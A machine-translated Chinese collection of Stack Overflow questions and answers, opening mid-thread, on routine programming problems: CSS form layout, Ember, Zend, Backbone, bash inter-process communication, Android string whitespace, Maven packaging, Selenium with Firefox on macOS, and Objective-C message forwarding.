::-webkit-input-placeholder {
color:#515b57; 
```

}

```
input:focus {
font-style: normal;
@include single-box-shadow(rgba(255,255,255,0.5), 0px, 0px, 6px); 
```

}

```
form {
display:inline-block; 
```

}

```
input[type="submit"] {
background:#B3B5B3;
height:23px;
border:0;
&:hover, &:focus {
    @include single-box-shadow(rgba(255,255,255,0.5), 0px, 0px, 6px);
} 
```

}

也许，填充有问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-02T14:41:25.660

你只是错过了`float property`所以用这个波纹管编辑你的CSS

```
input[type="text"] {
   color: #515b57;
   margin-right: 2px;
   float: left;
}

input[type="submit"] {
background:#B3B5B3;
height:23px;
float: left;
&:hover, &:focus {
    @include single-box-shadow(rgba(255,255,255,0.5), 0px, 0px, 6px);
}​

input::-moz-focus-inner
{
    border: 0;
    padding: 0;
} 
```

它应该工作。在 jsfiddle 上 看到[它。](http://jsfiddle.net/Sajmon/vB6xL/2/)`input::-moz-focus-inner`输入正确`text-align`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-02T14:18:01.637

试试这个 css，我已经从输入中删除了 padding:0

```
.search { 
background: #F3F4F3; 
padding: 10px; 
width: auto; 
color: #666; 
font-size: 11px; 
line-height: 1.3em; 
padding-top: 10px; 
margin-bottom: 20px; 
margin-top: 0px; 

 }
input { 
color:#fff; 
border:1px solid #B3B5B3; 
background:transparent; 
outline:none; 
height:21px;  
margin: 0; 
padding: 0px 8px; 
font-family: $std-sans-font; 

 }
input[type="text"] { 
color: #515b57; 

 }
:-moz-placeholder { 
color:#515b57; 

 }
::-webkit-input-placeholder { 
color:#515b57; 

 }
input:focus { 
font-style: normal; 
@include single-box-shadow(rgba(255,255,255,0.5), 0px, 0px, 6px); 

 }
form { 
display:inline-block; 

 }
input[type="submit"] { 
background:#B3B5B3; 
height:23px; 
border:0; 
&:hover, &:focus { 
    @include single-box-shadow(rgba(255,255,255,0.5), 0px, 0px, 6px); 
} 
```

# ember.js - 在当前运行循环完成之前，Ember 子状态不可用

> ID：10862963
> 
> 赞同：1
> 
> 时间：2012-06-02T14:12:03.763
> 
> 标签：ember.js

我有以下子状态定义：

```
App.ChildState = Ember.State.create({
  enter: function(manager) {
     //do stuff
  },
  start: Ember.ViewState.create({
    view: App.LoadingView,
    enter: function(manager) {
      this._super(manager);

      // manager cannot find the child otherstate
      manager.transitionTo('otherstate.index');
    }
  }),
  otherstate: App.OtherState 
```

除非我像这样将调用包装在 Ember.run.next 中，否则经理找不到孩子 otherstate：

```
Ember.run.next(function(){
   manager.transitionTo('otherstate.index');
}); 
```

谁能让我知道为什么经理需要这种延迟才能找到这个子状态并过渡到它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T22:59:04.637

让状态的 enter 方法触发转换不是正确的设计。您应该使用操作来进行任何有条件的状态转换。

# zend-framework - Zend Rest Route：转到正确的方法（get/put/post/delete）

> ID：10862965
> 
> 赞同：1
> 
> 时间：2012-06-02T14:12:14.710
> 
> 标签：zend-framework, zend-controller-router

我将停用一个用作 API 的自定义 PHP 项目。

我需要支持这样的 URL，例如

/post/{id}/copy.json（复制带有 {id} 的帖子 /post（所有帖子）/post/{id}（返回一个帖子）

到目前为止一切正常，但是我发现路由很困难。我希望 Zend 检测它是什么类型的请求，然后使用正确的方法。我倾向于将其放入 My_Controller_Rest 预调度中，将变量传递回控制器，然后在 indexAction 中执行 $this->getAction()

想法？我有点假设使用 Zend_Rest_Controller 它会触发正确的方法，除非我做错了，否则它不会。

我所有的控制器都扩展了一个抽象类，

控制器：

```
<?php

class Post_IndexController extends My_Controller_Rest
{

    public function init()
    {
    }

    public function indexAction()
    {

    }

    public function getAction()
    {
    }

    public function postAction()
    {
    }

    public function putAction()
    {
    }

    public function deleteAction()
    {
    }

} 
```

我的控制器休息

```
<?php

abstract class My_Controller_Rest extends Zend_Rest_Controller {

    public function preDispatch() {

        $this->_helper->viewRenderer->setNoRender(true);
        $request        = Zend_Controller_Front::getInstance()->getRequest();
        $this->output   = null;

        //get registry versions
        $config         = Zend_Registry::get('config');
        $cache          = Zend_Registry::get('cache');
        $log            = Zend_Registry::get('log');
        $loggers        = Zend_Registry::get('loggers');

        //internal to the view
        $this->_config      = $config;
        $this->_cache       = $cache;
        $this->_log         = $log;

        $this->data = array();
        $this->data['module']   = $request->getModuleName();
        $this->data['controller'] = $request->getControllerName();
        $this->data['action']   = $request->getActionName();
        $this->data['loggers']  = $loggers;
    }

    public function postDispatch() {
        header('Content-type: text/json');
        header('Content-type: application/json');

        echo json_encode(array('output' => $this->output, 'data' => $this->data));
        exit;
    }

} 
```

更新：

我通过使用 Resauce 解决了这个问题：[https ://github.com/mikekelly/Resauce](https://github.com/mikekelly/Resauce)

您可以通过查看此处找到我的改进：[https ://github.com/mikekelly/Resauce/issues/1](https://github.com/mikekelly/Resauce/issues/1)

# html - Safari 扩展“Popover”中的 iFrame

> ID：10862969
> 
> 赞同：3
> 
> 时间：2012-06-02T14:12:39.213
> 
> 标签：html, safari, google-chrome-extension, safari-extension

我有一个 Chrome 和 Firefox 扩展，我正在为 Safari 制作相同的扩展。

这些插件都有一个弹出窗口。换句话说，您单击一个图标并打开一个页面。我的 Chrome 扩展弹出窗口会在带有 iFrame 的插件文件夹中打开一个 HTML 页面。FF 扩展直接链接到服务器上的 PHP 页面以进行弹出窗口。

我需要用 Safari 做我用 Chrome 做的事情。我需要制作一个本地 HTML 页面，该页面在服务器上的页面上有一个 iFrame。这适用于 chrome，但 Safari 中的 iFrame 只是空白。

谢谢你的帮助...

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-05T14:06:09.357

Apple 不允许在弹出框内加载 iFrame……但是！您可以对任何域执行 XMLhttpRequest（现在说什么？）。是的 XMLhttpRequest 到任何域。例子：

我将它用于我的选择器（因为我不想在扩展中加载 jQuery 或 Mootools）：

```
function $(element) {
    return document.getElementById(element);
} 
```

像这样做一个 XMLhttpRequest ：

```
http = new XMLHttpRequest();
http.open('get', 'http://yoursitehere.com/extension/');
http.onreadystatechange = function () {
    $('target-div-id').innerHTML = http.responseText;
} 
```

通过这种方式，您可以使用 HTML 填充目标 div。

# bash - 没有 FIFO 的进程间通信

> ID：10862970
> 
> 赞同：13
> 
> 时间：2012-06-02T14:12:45.943
> 
> 标签：bash, file-descriptor, fifo

在 BASH 脚本中，我们可以让多个进程在后台运行，它们使用命名管道（在文件系统上注册的 FIFO）相互通信。这方面的一个例子可能是：

```
#!/bin/bash
mkfifo FIFO

# BG process 1
while :; do echo x; done & >FIFO

# BG process 2
while :; do read; done & <FIFO

exit 
```

我想知道是否可以在不使用文件系统上的 FIFO 的情况下在脚本的后台进程之间进行相同的相互通信，也许可以使用某种文件描述符重定向。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-07T07:21:24.730

这是一个运行两个子进程的示例，该子进程实现为同一个 shell 脚本的函数...一个子进程生成数字 1...5（在打印之间休眠），第二个子进程从固定的文件描述符（5，STDOUT 的第一个 FD 被重定向到），乘以 2 并再次打印。主进程将第二个进程的 STDOUT 重定向到另一个固定的文件描述符（6），然后在循环中从那个文件中读取。

它的工作原理与使用 pipe(2) 系统调用创建的 fd 对在 C 代码中所做的基本相同。要了解发生了什么，请在 strace -f 下运行脚本！

Bash 版本是在 Ubuntu/x86 上运行的 4.2.24(1)。

```
[ubuntu /home/chris]
$ bash --version
GNU bash, version 4.2.24(1)-release (i686-pc-linux-gnu)
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law. 
```

脚本输出：

```
[ubuntu /home/chris]
$ ./read_from_fd.sh
Got number 2.
Got number 4.
Got number 6.
Got number 8.
Got number 10. 
```

源代码：

```
#!/bin/bash

# Generate data, output to STDOUT.
generate_five_numbers() {
        for n in `seq 5` ; do
                echo $n
                sleep 2
        done
}

# Read data from FD#5, multiply by two, output to STDOUT.
multiply_number_from_fd5_by_two() {
        while read n <&5 ; do
                echo "$(( $n * 2 ))"
        done
}

# choose your FD number wisely ;-)

# run generator with its output dup'ed to FD #5
exec 5< <( generate_five_numbers )

# run multiplyier (reading from fd 5) with output dup'ed to FD #6
exec 6< <( multiply_number_from_fd5_by_two )

# read numbers from fd 6
while read n <&6 ; do
        echo "Got number $n."
done 
```

运行时的进程树：

```
──read_from_fd.sh(8118)─┬─read_from_fd.sh(8119)───sleep(8123)
                        └─read_from_fd.sh(8120) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-02T14:33:45.260

Bash 4 有[协同](http://tiswww.case.edu/php/chet/bash/bashref.html#SEC23)进程。

您还可以使用匿名命名管道，也就是Bash 2、3 或 4 中的[进程替换。](http://tiswww.case.edu/php/chet/bash/bashref.html#SEC35)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-04T13:21:17.170

您可以使用[`nc`](http://www.manpagez.com/man/1/nc/)(aka `netcat`)，它允许将脚本的标准流连接到网络套接字。当然，它也适用于 localhost，因此您可以将它用于脚本之间的 IPC。好处是可以在不同的主机上运行脚本，这对于 FIFO 是不可能的（好吧，也许在 NFS 上是这样，但除非你已经有 NFS，否则设置起来会相当麻烦）。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-02-03T07:20:58.040

我只想指出，丑陋的黑客不希望这样出生。

## 接收数据的部分：

```
node -e "require('net').createServer(function(s){s.pipe(process.stdout)}).listen(1337)" 
```

## 发送数据的部分：

```
echo "write clean code they said" > /dev/tcp/localhost/1337
echo "it will pay off they said" > /dev/tcp/localhost/1337 
```

* * *

令我惊讶的是，它甚至可以在 MSysGit 的 Windows 版 Bash 中使用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-03-10T11:16:59.320

你考虑过信号的使用吗？如果您唯一需要的是触发事件（不传递参数），那么使用 kill 和 trap 可以完美地工作（但要注意语义，例如使用 SIGUSR1）。

不过，您可能需要重新编写逻辑，如下例所示：

```
subprocess_finished()
{
    np=$( jobs -p | wc -l )
}

start_processing()
{
    myfile="$1"
    # DO SOMETHING HERE!!
    kill -SIGUSR1 $2
}

CPUS=$( lscpu | grep "^CPU(s):" | rev | cut -f 1 -d ' ' | rev )
POLLPERIOD=5  # 5s between each poll
np=0
trap subprocess_finished SIGUSR1

for myfile in *
do 
        start_processing "$myfile" $$ &
        np=$( jobs -p | wc -l )
        echo "$( date +'%Y-%m-%d %H:%M:%S' ) [$!] Starting #$np on $CPUS: $myfile"

        if [ $np -eq $CPUS ] 
        then
            # Wait for one CPU to be free
            trap subprocess_finished SIGUSR1
            while [ $np -eq $CPUS ]
            do
                sleep $POLLPERIOD
            done
        fi
    done
done

# wait for the last subprocesses
while [ ! -z "$( jobs -rp )" ]
do
    sleep $POLLPERIOD
done 
```

# android - 如何将空格字符放入 XML 中的字符串名称中？

> ID：10862975
> 
> 赞同：207
> 
> 时间：2012-06-02T14:13:34.527
> 
> 标签：android, xml, whitespace

我在`strings.xml`文件中定义了一些字符串。现在我需要在字符串中的一些数字之间放置一些额外的空格。当我输入额外的空格字符时，这并没有显示在应用程序上。

前：

```
<string name="spelatonertext3">-4, 5, -5, 6, -6, 
```

如果我像这样放置额外的空间：

```
<string name="spelatonertext3">-4,  5, -5,   6,  -6, 
```

它只是在应用程序上看起来相同。如何在 XML 字符串中添加空格字符？

* * *

## 回答 #1

> 赞同：469
> 
> 时间：2012-06-02T14:17:15.997

使用 xml 中的空格作为字符串使用`&#160;`. XML 不会按原样占用空格。它会在设置之前修剪空白。所以使用`&#160;`而不是单个空格

* * *

## 回答 #2

> 赞同：73
> 
> 时间：2012-06-02T14:20:51.403

直接在 XML 中插入 \u0020 以获得您想要保留的空白。

```
<string name="spelatonertext3">-4, \u00205, \u0020\u0020-5, \u00206, \u0020-6,</string> 
```

* * *

## 回答 #3

> 赞同：39
> 
> 时间：2017-02-08T14:02:26.700

Android 不支持在 String.xml 文件中的字符串末尾保留空格，因此如果您希望在字符串后有空格，则需要在单词之间使用此 unicode。

> \u0020

它是一个 unicode 空格字符。

* * *

## 回答 #4

> 赞同：17
> 
> 时间：2018-01-31T02:24:37.120

这也应该有效。使用引号来保持空间

```
<string name="spelatonertext3">"-4,  5, -5,   6,  -6,"</string> 
```

* * *

## 回答 #5

> 赞同：12
> 
> 时间：2016-09-09T04:48:10.930

如前所述，在 XML 文件中使用空格的正确方法是使用`\u0020`which 是空格的 unicode 字符。

例子：

```
<string name="spelatonertext3">-4,\u00205,\u0020-5,\u00206,\u0020-6</string> 
```

其他建议说使用`&#160;`or`&#032;`但这有两个缺点。第一个缺点是这些是 ASCII 字符，因此您依赖于 TextView 之类的东西来解析它们。第二个缺点是`&#160;`有时会导致 TextView 中出现奇怪的包装。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2016-03-04T09:44:18.070

放入`&#160;`string.xml 文件以指示 android 项目中的单个空格。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2016-03-14T15:46:19.223

空间变体：

```
<string name="space_demo">|&#x20;|&#x2009;|&#x200A;|</string> 
```

| 空间 | 薄空间 | 头发空间 |

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2016-06-15T19:41:04.350

您也可以使用以下

```
<string name="spelatonertext3"> "-4,  5, -5,   6,  -6, "> </string> 
```

将任何内容放在`" "`（引号）中，并带有空格，它应该可以工作

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2018-07-13T13:31:37.290

如果您尝试在 2 个字符串之间或在 android 的字符串文件中提供空格，请在您的字符串文件中执行此操作。在您要显示的“字符串名称”之前实施此操作。 **\u0020\u0020** 例如。 **\u0020\u0020\u0020\u0020\u0020\u0020付款**

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2017-08-11T13:13:48.037

根据您的问题，如果您想在字符串资源中添加多个空格，它们有很多选项可以在字符或单词之间添加空格：

1.默认情况下，您可以直接在字符串资源文件中添加一个空格，它可以正常工作。但如果在字符串资源文件中给出多个空格，则它会排除该空格。例如。-4, 5, -5, 6, -6,

2.  如果您想在字符串资源文件中添加更多额外空格，请使用：- i。在字符后添加 unicode

    ```
     <string name="test">-4,&#160;&#160;5,&#160;&#160;-5,&#160;&#160;6,&#160;&#160;-6,</string> 
    ```

ii.您可以使用“\u0020”

```
<string name="test">-4,\u0020\u0020 5,\u0020\u00205 -5,\u0020\u00205 6,\u0020\u00205 -6,</string> 
```

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2017-11-12T16:01:10.143

我可以在字符串中间获得多个空格的唯一方法。

```
<string name="some_string">Before" &#x20; &#x20; &#x20;"After</string>

Before   After 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2014-08-11T07:25:21.927

~~xml:space="保留"~~

~~奇迹般有效。~~

编辑：错误。实际上，它仅在内容仅由空格组成时才有效。

[关联](https://stackoverflow.com/questions/414631/can-you-preserve-leading-and-trailing-whitespace-in-xml)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2012-06-02T17:53:42.620

如果输出是 HTML，则在 HTML 中，多个空格显示为一个空格。为防止这种情况，请使用不间断空格 (xA0) 而不是普通空格。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2017-01-20T08:23:05.490

你想让它显示为“-4, 5, -5, 6, -6”（两个空格），你可以在 string.xml 中添加以下代码

> `<string name="spelatonertext3"> "-4,&#160;&#160;5,&#160;-5,&#160;&#160;6,&#160;&#160;-6,"</string>`

是显示一个空格。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2021-05-31T19:34:00.610

在 Android Studio 中，您可以打开 strings.xml 文件，然后单击“打开编辑器”，在编辑器中您可以输入任何内容，**它会处理它，让您完全按照您输入的内容出现在应用程序中**。

我知道写这个答案可能为时已晚，但它可能会对某人有所帮助。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2021-08-04T09:58:23.713

如此处所述[https://www.programmersought.com/article/33576744031/](https://www.programmersought.com/article/33576744031/)使用  

例子

```
<string name="in">in &#160; </string 
```

# javascript - 如何在 submitHandler 回调中访问主干视图？

> ID：10862979
> 
> 赞同：1
> 
> 时间：2012-06-02T14:14:37.077
> 
> 标签：javascript, jquery, backbone.js

我正在探索backbone.js，并且正在尝试设置简单的登录页面。这是我的 view.js 文件：

```
window.LoginView = Backbone.View.extend({   

    events: {

    },

    initialize : function() {       
        this.model.bind("error", this.error);       
        this.template = _.template(tpl.get('login'));       
    },  

    login: function(form){
        this.model.set({
            login: $("#login", form).val(),
            password: $("#password", form).val()
        });         
    },  

    render : function(eventName) {      
        $(this.el).html(this.template());   
        $(this.el).find("form").validate({
            submitHandler: this.login
        });
        return this;
    }
}); 
```

如您所见，我在函数中使用`jquery.validation`附加到表单。`render`作为 submitHandler 回调我已经设置了`login`函数。这条线

```
this.model.set({... 
```

给了我`this.model is undefined`错误，所以我假设`this`in login 功能与`this`in `initialize`or`render`功能不同。我的问题是如何`this`在登录功能中访问骨干网？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T14:25:31.127

一种方法是使用 jQuery.proxy() 为登录函数设置“this”的值：

```
$(this.el).find("form").validate({
  submitHandler: $.proxy(this.login, this)
}); 
```

代理返回一个带有“this”新值的新函数。由于渲染函数中的“this”指向您的视图，因此您将其作为第二个参数传递给代理。

# java - Maven - 生成 Jar 和 War

> ID：10862980
> 
> 赞同：25
> 
> 时间：2012-06-02T14:14:58.780
> 
> 标签：java, maven, maven-2, cxf, maven-plugin

我有一个 CXF WS 项目，我会在另一个项目中使用它，我会在 Web 项目中使用这个 WS，但我不知道如何生成 Jar 文件。

请问您有什么想法或例子吗？

谢谢

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-06-02T15:13:28.180

maven-war-plugin 支持创建仅包含类的单独工件。

[http://maven.apache.org/plugins/maven-war-plugin/war-mojo.html](http://maven.apache.org/plugins/maven-war-plugin/war-mojo.html)

请参阅“attachClasses”参数。无需添加 jar 插件或弄乱包装。只需将战争插件添加到 pluginManagement 并打开它。

但是，我担心这不是您想要的。要使用 CXF Web 服务，您需要一个客户端。要获取客户端，请按照 CXF 示例中的说明了解如何生成和使用客户端存根。为此，您需要一个单独的 Maven 项目。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2012-06-02T14:37:55.653

尝试将其添加到您的构建部分：

```
<build>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-jar-plugin</artifactId>
      <executions>
        <execution>
          <id>make-a-jar</id>
          <phase>compile</phase>
          <goals>
            <goal>jar</goal>
          </goals>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build> 
```

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2017-04-06T06:30:02.223

在 war 项目的 pom.xml 中添加以下内容。

`<attachClasses>true</attachClasses>`配置war插件

```
<groupId>com.yourorg.foobar</groupId>
<artifactId>hello-world</artifactId>
<packaging>war</packaging>
<version>1.0</version>
<name>hello</name>

<build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-war-plugin</artifactId>
            <version>3.0.0</version>
            <configuration>
                <attachClasses>true</attachClasses>
            </configuration>
        </plugin>
    </plugins>
</build> 
```

在要导入 jar of war 项目的项目的 pom.xml 中添加以下内容

`<classifier>classes</classifier>`依赖导入

```
<dependency>
    <groupId>com.yourorg.foobar</groupId>
    <artifactId>hello-world</artifactId>
    <version>1.0</version>
    <classifier>classes</classifier>
</dependency> 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2014-12-26T22:35:01.797

这是通过属性实现它的一种方法。默认情况下它会生成一个war文件，当你想要jar时只需设置属性。

```
mvn install -Dp.type=jar 
```

pom.xml

```
<properties>
   <p.type>war</p.type>
</properties>
<packaging>${p.type}</packaging> 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2017-06-13T07:14:04.650

这应该有效：

```
<!-- Maven JAR plugin -->
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-jar-plugin</artifactId>
    <executions>
        <execution>
            <id>jar-services-provided</id>
            <phase>compile</phase>
            <goals>
                <goal>jar</goal>
            </goals>
        </execution>
    </executions>
</plugin>

<!-- Install the jar locally -->
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-install-plugin</artifactId>
    <executions>
        <execution>
            <phase>install</phase>
            <goals>
                <goal>install-file</goal>
            </goals>
            <configuration>
                <packaging>jar</packaging>
                <artifactId>${project.artifactId}</artifactId>
                <groupId>${project.groupId}</groupId>
                <version>${project.version}</version>
                <file>
                    ${project.build.directory}/${project.artifactId}-${project.version}.jar
                </file>
            </configuration>
        </execution>
    </executions>
</plugin> 
```

取自[这个博客](http://communitygrids.blogspot.co.at/2007/11/maven-making-war-and-jar-at-same-time.html)。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2018-12-04T21:46:35.903

考虑将您的 Maven 项目打包到战争中

```
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <modelVersion>4.0.0</modelVersion>

    <groupId>com.sample</groupId>
    <artifactId>sample</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>war</packaging> 
```

将以下执行添加到 maven-install-plugin

```
 <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-install-plugin</artifactId>
        <version>2.5.2</version>
        <executions>
            <execution>
                <phase>package</phase>
                <configuration>
                    <packaging>jar</packaging>
                    <file>${project.build.directory}\${artifactId}-${version}.jar</file>
                </configuration>
                <goals>
                    <goal>install-file</goal>
                </goals>
            </execution>
        </executions>
    </plugin> 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-06-02T14:57:14.103

`mvn package`除非您的[项目的包装](http://maven.apache.org/pom.html#Maven_Coordinates)是`jar`. 然后，您需要[添加](http://www.sonatype.com/books/mvnref-book/reference/_configuring_maven_plugins.html#configuring-sect-exec-param)[jar plugin](http://maven.apache.org/plugins/maven-jar-plugin/)的执行，如[插件的使用页面](http://maven.apache.org/plugins/maven-jar-plugin/usage.html)所述以及第一个答案所示。更好的是，如果它不是 jar，则将其分成两个模块：一个是包含可重用代码的 jar，另一个是使用它的东西。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2018-02-27T19:54:41.293

实现这一点的最佳方法是通过使用 Maven 程序集插件，您还可以控制 jar 的最终名称：

在 pom.xml 中添加以下插件：

```
 <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-assembly-plugin</artifactId>
            <version>2.4</version>
            <configuration>
                <descriptors>
                    <descriptor>assembly.xml</descriptor>
                </descriptors>
                <finalName>${artifactId}-${version}</finalName>
                <appendAssemblyId>false</appendAssemblyId>
            </configuration>
        </plugin> 
```

组装.xml：

```
<assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.0" 
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.0 http://maven.apache.org/xsd/assembly-1.1.0.xsd">
  <id>model</id>
  <formats>
    <format>jar</format>
  </formats>
  <includeBaseDirectory>false</includeBaseDirectory>
  <fileSets>
    <fileSet>
      <directory>${project.build.outputDirectory}</directory>
      <outputDirectory>/</outputDirectory>
      <includes>
        <include>**/*</include>
      </includes>
    </fileSet>
  </fileSets>
</assembly> 
```

您最终可以使用以下命令构建项目：

mvn clean package 组件：单次安装

# python - 运行测试时在 OSX Dock 中抑制 Firefox 图标

> ID：10862982
> 
> 赞同：0
> 
> 时间：2012-06-02T14:15:05.713
> 
> 标签：python, macos, firefox, selenium

目前在 OSX 上，Selenium 驱动程序启动会在 OSX 上打开一个新的 Firefox 图标。此外，当前应用程序会失去焦点，从而中断例如您的打字。

是否有可能让 Selenium 在 OSX 上启动 Firefox，这样它就不会集中注意力或在 Dock 中引起额外的动作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-02T16:48:06.503

您可以轻松修改 Firefox，使其不会出现在 Dock 中。

在 Finder 中，右键单击 Firefox 应用程序图标并选择显示包内容。然后打开 Contents 文件夹并`Info.plist`使用 Property List Editor（XCode 附带）或 BBEdit/TextWrangler 进行编辑。在文件的开头添加`LSUIElement`一个值为 的键`<true/>`。在 BBEdit/TextWrangler 中，文件的开头如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>LSUIElement</key>
    <true/> 
```

在 Property List Editor 中，右键单击任意键并选择 Show Raw Keys/Values，然后右键单击顶级条目（“Information Property List”）并选择 Add Row。指定`LSUIelement`此项的值并标记复选框。

我建议使用 Property List Editor 或 BBEdit/TextWrangler 而不是其他编辑器，因为`.plist`这些天大多数文件都是二进制格式，并且这些工具可以处理 binary `.plist`。其他文本编辑器只会显示乱码。但是，我应该提到您可以`Info.plist`使用命令行实用程序将文件转换为文本`plutil`，例如：

```
plutil -convert xml1 /Applications/Firefox.app/Contents/Info.plist 
```

然后你可以在任何你喜欢的文本编辑器中编辑它。之后您甚至不必将其转换回二进制文件；文本格式实际上可以正常工作。

无论如何，保存 info.plist 文件并关闭并重新启动 Firefox。图标（和菜单栏）现在将消失。（不，不可能显示菜单栏但隐藏图标，但我认为这不会打扰 Selenium。）

关于您的第二个问题：从技术上讲，启动应用程序而不给它焦点是可行的。例如，这个 Applescript 启动 Firefox 并获取窗口列表，但不发送`activate`将其带到前面的消息。

```
tell application "Firefox" to get windows 
```

您可以发送任何消息；这`get windows`部分只是为了我们的目的而无所作为。关键是，您必须向 Firefox 发送*一些*消息以使其启动（AppleScript 知道您无法向未运行的应用程序发送消息，因此它会为您启动它，但在后台）。

现在我不确定 Selenium 如何启动浏览器，但可以修改它以使用`osascript`命令行工具或类似的东西启动 Firefox，并使用上述命令。

```
osascript -e 'tell application "Firefox" to get windows' 
```

我会留给你把这些碎片放在一起......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-03T09:25:16.463

问题是由于 Firefox 在没有焦点时并不总是正确地触发事件。这将很快得到修复，因为它现在是 HTML5 规范的规范部分。

我建议在 virtualbox 或 VMWare Fusion 之类的东西中使用一个非常轻量级的 VM，并且只使用 Remote WebDriver。

# objective-c - forwardInvocation 到其他类而不是实例

> ID：10862984
> 
> 赞同：3
> 
> 时间：2012-06-02T14:15:21.917
> 
> 标签：objective-c

我有一个[门面](http://en.wikipedia.org/wiki/Facade_pattern)单例，我想将一些类方法调用转发给一些“静态”类。

乍一看，`forwardInvocation:`似乎是一个可能的解决方案，但是，`NSInvocation`'s`invokeWithTarget:`并且`setTarget:`只接受一个`id`，即指向实例的指针，而不是类本身。我尝试将其作为目标移交`[MyTargetClass class]`，但是当我在`[Facade someForwardedMethod]`某处调用时，仍然会收到“No known class method [...]”错误。当我打电话时，`[[Facade sharedInstance] someForwardedMethod]`我收到“没有可见的@interface [...] 声明选择器 [...]”错误。

当然我知道我还需要重写`respondsToSelector:`and `methodSignatureForSelector:`，所以我的代码如下所示：

```
- (BOOL)respondsToSelector:(SEL)aSelector {
    if ([super respondsToSelector:aSelector]) {
        return YES;
    } else {
        return [MyTargetClass respondsToSelector:aSelector];
    }
}

- (NSMethodSignature *)methodSignatureForSelector:(SEL)selector {
    NSMethodSignature* signature = [super methodSignatureForSelector:selector];
    if (!signature) {
        signature = [MyTargetClass methodSignatureForSelector:selector];
    }
    return signature;
}

- (void)forwardInvocation:(NSInvocation *)anInvocation {

    SEL aSelector = [anInvocation selector];

    if ([MyTargetClass respondsToSelector: aSelector]) {
        [anInvocation invokeWithTarget:[MyTargetClass class]];
    } else {
        [super forwardInvocation:anInvocation];
    }
} 
```

有没有办法使这项工作，还是我必须选择另一种方法？

* * *

编辑：我已经尝试了 Rob Napier 在他的回答中提到的两种方式，这是我的发现：

我可以通过外观实例调用目标类中的类方法

```
[(id)[Facade sharedInstance] doSomethingClassyInTargetClass]; 
```

它比我希望的要丑一些，但它确实有效。但是，当我处理外观类时，我无法在目标类中调用类方法。为了让编译器安静，我可以写

```
[(Class)[Facade class] doSomethingClassyInTargetClass]; 
```

但随后它会在运行时抛出一个 'NSInvalidArgumentException' “[Facade doSomethingClassyInTargetClass]: unrecognized selector sent to class [...]”。显然，门面类的类方法在不尊重的情况下得到解决`forwardInvocation:`，但毕竟它`-`前面有一个......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-02T18:50:13.637

啊，当您添加“No visible @interface [...] 声明选择器 [...]”时，一切都清楚了。

考虑一个只有实例方法的更简单的形式。你实现`-forwardInvocation:`，然后你有这样的代码：

```
[obj doSomething]; 
```

现在，`MyObject`实际上并没有`doSomething`在其标题中声明，即使它会响应它。所以编译器抱怨这可能行不通。解决方法是：

```
[(id)obj doSomething]; 
```

当你声明 something`id`时，编译器会停止检查目标是否实际实现了选择器。但也有可能*没有*接口声明`doSomething`。然后编译器再次怀疑它可能是一个错字，并给你一个警告。我所说的“无接口”是指“没有编译器可以访问的接口”。编译器只能访问此编译单元中的接口（即 .m 文件及其包含的头文件）。因此，您需要确保包含定义此选择器的标头。

现在对于类，您不能使用`id`，但您应该能够使用`Class`来实现相同的目的，例如：

```
[(Class)MyClass doSomethingClassy]; 
```

如果可能想查看 iOS:PTL 第 4 章中的[RNObserverManager](https://github.com/rnapier/ios5ptl/blob/master/ch04/ObserverTrampoline/RNObserverManager.h)示例代码，它演示了类似的内容。

